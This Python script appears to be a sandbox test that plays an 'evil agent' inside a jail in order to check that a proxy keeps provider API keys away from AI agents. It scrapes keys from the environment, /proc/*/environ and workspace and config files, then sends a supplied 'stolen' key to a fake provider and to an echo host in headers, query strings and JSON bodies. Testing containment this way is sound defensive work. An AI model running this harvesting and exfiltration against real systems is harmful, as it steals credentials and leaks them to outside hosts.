"""Evil agent: find the model's key, and use a real one it stole.

Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
<script> <anthropic host> <openai host> <echo host> <stolen real key> <tag>
Prints one JSON object on its last line.

First it looks for keys: its environment, every /proc/*/environ it can read, every file under
/workspace, /config, /tmp and /etc/backtide-ca, and what its own requests carry when they leave
(the echo host answers with the headers it received). Then it uses the real key the test hands it
as if it had stolen it: in the provider's header, and towards an ordinary host in a header, in the
query and in a JSON body. And it tries the provider in clear (http://) and with no key at all.
The hosts are the test's fake internet; nothing reaches a real provider.
"""

import http.client
import json
import os
import re
import ssl
import sys
from pathlib import Path
from urllib.parse import quote

anthropic, openai, echo, stolen, tag = sys.argv[1:6]
PROXY = ("backtide-proxy", 8080)
CA = "/etc/backtide-ca/ca.pem"
# Anything with the shape of a provider key (an OpenClaw bundle has look-alikes: the test sorts
# them out against the keys it knows) and the fake keys' own shape.
KEYISH = re.compile(
    rb"(?<![A-Za-z0-9_-])(?:sk-[A-Za-z0-9_-]{16,}|backtide-fake-[a-z0-9-]+-[A-Za-z0-9]{32})"
)
MAX_FILE = 8 * 1024 * 1024


def keys_in(data):
    return {match.decode() for match in KEYISH.findall(data)}


found = {}


def note(where, data):
    for key in keys_in(data):
        found.setdefault(key, []).append(where)


note("environment", "\n".join(f"{k}={v}" for k, v in os.environ.items()).encode())
for environ in Path("/proc").glob("[0-9]*/environ"):
    try:
        note(str(environ), environ.read_bytes())
    except OSError:
        pass
for root in ("/workspace", "/config", "/tmp", "/etc/backtide-ca"):  # noqa: S108 - in the jail
    for directory, _, files in os.walk(root):
        for name in files:
            path = Path(directory, name)
            try:
                if path.is_file() and not path.is_symlink() and path.stat().st_size <= MAX_FILE:
                    note(str(path), path.read_bytes())
            except OSError:
                pass


def through_proxy(host, path, method="GET", headers=None, body=None):
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=30, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(host, 443)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        response = conn.getresponse()
        return {"status": response.status, "body": response.read(20000).decode("latin-1")}
    except (OSError, http.client.HTTPException) as error:
        return {"status": None, "error": f"{type(error).__name__}: {error}"[:300]}
    finally:
        conn.close()


def in_clear(host, path, headers):
    conn = http.client.HTTPConnection(*PROXY, timeout=30)
    try:
        conn.request("POST", f"http://{host}{path}", body=b"{}", headers={"Host": host, **headers})
        response = conn.getresponse()
        return {"status": response.status, "body": response.read(2000).decode("latin-1")}
    except (OSError, http.client.HTTPException) as error:
        return {"status": None, "error": f"{type(error).__name__}: {error}"[:300]}
    finally:
        conn.close()


fakes = sorted(k for k in found if k.startswith("backtide-fake-"))
fake = next((k for k in fakes if "anthropic" in k), None)
fake_openai = next((k for k in fakes if "openai" in k), None)
echoed = through_proxy(
    echo,
    f"/{tag}/echo",
    headers={"x-api-key": fake or "none", "Authorization": f"Bearer {fake_openai or 'none'}"},
)
note("echo of its own request", echoed.get("body", "").encode())
message = json.dumps(
    {"model": "fake-claude", "max_tokens": 16, "messages": [{"role": "user", "content": "hi"}]}
).encode()
json_headers = {"content-type": "application/json", "anthropic-version": "2023-06-01"}
uses = {
    "provider_with_its_fake_key": through_proxy(
        anthropic, f"/{tag}/fake/v1/messages", "POST", {**json_headers, "x-api-key": fake}, message
    ),
    "provider_with_the_real_key": through_proxy(
        anthropic,
        f"/{tag}/real/v1/messages",
        "POST",
        {**json_headers, "x-api-key": stolen},
        message,
    ),
    "openai_with_the_real_key": through_proxy(
        openai,
        f"/{tag}/real/v1/chat/completions",
        "POST",
        {"content-type": "application/json", "authorization": f"Bearer {stolen}"},
        b"{}",
    ),  # fmt: skip
    "elsewhere_in_a_header": through_proxy(echo, f"/{tag}/header", headers={"X-Note": stolen}),
    "elsewhere_in_the_query": through_proxy(echo, f"/{tag}/query?k={quote(stolen)}"),
    "elsewhere_in_a_body": through_proxy(
        echo,
        f"/{tag}/body",
        "POST",
        {"content-type": "application/json"},
        json.dumps({"key": stolen}).encode(),
    ),  # fmt: skip
    "provider_in_clear": in_clear(anthropic, f"/{tag}/clear/v1/messages", {"x-api-key": fake}),
    "provider_without_a_key": through_proxy(
        anthropic, f"/{tag}/nokey/v1/messages", "POST", json_headers, message
    ),
}
print(
    json.dumps(
        {
            "found": {key: sorted(set(places))[:5] for key, places in found.items()},
            "echoed_status": echoed.get("status"),
            "uses": {name: use.get("status") for name, use in uses.items()},
            "fake_reply": uses["provider_with_its_fake_key"].get("body", "")[:300],
        }
    )
)
